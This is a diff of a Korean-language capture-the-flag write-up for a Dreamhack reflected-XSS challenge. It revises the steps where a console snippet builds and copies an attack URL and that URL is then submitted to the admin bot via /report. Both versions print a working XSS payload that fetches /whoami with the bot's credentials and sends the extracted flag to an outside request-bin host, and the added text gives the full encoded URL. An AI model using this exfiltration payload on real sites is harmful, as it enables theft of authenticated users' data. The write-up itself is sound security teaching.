@@ -78,9 +78,9 @@ if ((id == 'admin') and (password == '[**REDACTED**]')):
 
 봇은 앞에서 설정한 인증 헤더를 사용하므로 `/whoami`의 관리자 검사를 통과할 수 있다. **여기서 FLAG는 봇이 받은 HTML 응답에 들어 있으며, 내 브라우저에는 직접 보이지 않는다.**
 
-### 3. Console에서 XSS URL을 만든다
+### 3. Console에 실제 입력한 코드
 
-문제 사이트에서 **F12 → Console**을 열고 다음 코드를 입력한다.
+**입력 위치:** 문제 사이트의 **F12 → Console**. 아래 두 줄이 스크린샷에서 실행한 코드다.
 
 ```javascript
 var p = `<script>fetch('/whoami').then(r=>r.text()).then(t=>{let f=t.match(/DH[{][^}]+[}]/);if(f)new Image().src='https://bsnahem.request.dreamhack.games/?flag='+encodeURIComponent(f[0])})</script>`;
@@ -88,24 +88,27 @@ var p = `<script>fetch('/whoami').then(r=>r.text()).then(t=>{let f=t.match(/DH[{
 copy(location.origin+'/intro?name='+encodeURIComponent(p)+'&detail=x');
 ```
 
-<img src="assets/intro-02-console.webp" alt="콘솔에서 XSS 코드를 만들고 URL을 복사한 화면" width="840">
+<img src="assets/intro-02-console.webp" alt="Console에 실제 입력한 스크립트와 URL 복사 코드" width="840">
 
-- `p`: `/intro`에서 실행시킬 스크립트 문자열
-- `encodeURIComponent(p)`: `<`, `>` 등을 URL에 넣을 수 있도록 인코딩
-- `copy(...)`: XSS가 담긴 **전체 `/intro?name=...` URL을 복사** (`undefined`는 오류가 아님)
-- `detail=x`: 서버가 `detail`도 받아 URL을 재구성하도록 값 지정
+- `p`: `name`에 삽입할 **XSS 스크립트 전체**
+- `encodeURIComponent(p)`: 스크립트를 URL의 파라미터 값으로 인코딩
+- `copy(...)`: 완성된 주소를 클립보드에 복사 (콘솔의 `undefined`는 오류가 아님)
 
-이 시점에는 **코드를 만들고 복사했을 뿐**, 관리자 봇에서 실행한 것이 아니다.
+**이 단계는 주소만 만든 것**이고, 실제 실행은 다음 단계에서 봇이 페이지를 방문할 때 발생한다.
 
-### 4. `/report`에 URL을 제출한다
+### 4. `/report`에 실제로 입력한 URL
 
-`/report` 입력창에 **콘솔에서 복사한 전체 URL**을 붙여넣고 `Report`를 누른다.
+**입력 위치:** `/report`의 **Enter URL path** 입력창. 위 Console 코드로 생성해 복사한 주소를 다음과 같이 붙여넣었다.
 
-<img src="assets/intro-03-report.webp" alt="Report URL 제출 전후 및 Success 표시" width="840">
+```text
+http://host3.dreamhack.games:8491/intro?name=%3Cscript%3Efetch('%2Fwhoami').then(r%3D%3Er.text()).then(t%3D%3E%7Blet%20f%3Dt.match(%2FDH%5B%7B%5D%5B%5E%7D%5D%2B%5B%7D%5D%2F)%3Bif(f)new%20Image().src%3D'https%3A%2F%2Fbsnahem.request.dreamhack.games%2F%3Fflag%3D'%2BencodeURIComponent(f%5B0%5D)%7D)%3C%2Fscript%3E&detail=x
+```
 
-그러면 `/report`가 URL의 `name`에서 XSS 코드를 추출해 `access_page()`를 호출하고, **관리자 봇이 `/intro`를 방문하면서 XSS가 실행된다.**
+<img src="assets/intro-03-report.webp" alt="Report URL 입력창에 위 URL을 붙여넣고 Success가 표시된 화면" width="840">
 
-화면의 **`Success`는 봇 방문 절차가 성공했다는 뜻**이지, FLAG 전송까지 확인된 것은 아니다.
+`/report`는 URL에서 `name` 값을 추출하고 `access_page(name, detail)`을 호출한다. 봇은 `/intro`를 방문해 HTML에 포함된 스크립트를 실행한다.
+
+**`Success`는 봇의 방문 처리 성공**을 뜻하며, FLAG 전송 성공은 마지막 Request Bin 사진에서 확인한다.
 
 ### 5. 실행된 스크립트와 FLAG 전송 과정
 
